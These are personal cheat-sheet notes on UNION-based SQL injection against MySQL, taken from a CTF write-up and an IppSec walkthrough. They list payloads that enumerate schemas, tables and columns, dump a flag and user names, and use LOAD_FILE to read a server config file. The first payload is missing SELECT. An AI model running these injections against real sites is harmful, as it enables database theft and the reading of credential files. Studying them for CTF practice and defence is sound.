---
title: "SLQ Injection Enumeration (Web)"
category: "web"
type: "technique"
tags: ["my-notes", "personal", "union-select", "mysql", "slq", "injection", "enumeration", "web"]
summary: "Reference: https://velog.io/@buaii/Dreamhack-CTF-Seaon-4-8-div2"
source:
  name: "Personal notes"
origin_path: "Web/SLQ Injection Enumeration.md"
---

```sql
admin' union 1,2,3,4 #
```

**Get table names**
```sql
admin' union select 1,2,3,table_name from information_schema.tables#
```

**Get column names**
```sql
admin' union select 1,2,3,column_name from information_schema.columns#
```
**Reference**: https://velog.io/@buaii/Dreamhack-CTF-Seaon-4-8-div2
# UNION
-> https://www.youtube.com/watch?v=z5pdizHDvt8&t=1073s&ab_channel=IppSec
```
player=a' union select group_concat(schema_name) from information_schema.schemata-- -
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

```
player=a' union select group_concat(table_name) from information_schema.tables where table_schema='november'-- -
Sorry, flag,players you are not eligible due to already qualifying.
flag
players
```

```
player=a' union select group_concat(column_name) from information_schema.columns where table_name='flag'-- -
Sorry, one you are not eligible due to already qualifying.
```

```
player=a' union select one from flag-- -
UHC{F1rst_5tep_2_Qualify}
```

```
player=a' union select group_concat(player) from players-- -
ippsec,celesian,big0us,luska,tinyboy
```

```
player=a' union select LOAD_FILE('/var/www/html/config.php')-- -
```

---

*From your own notes: `Web/SLQ Injection Enumeration.md`*
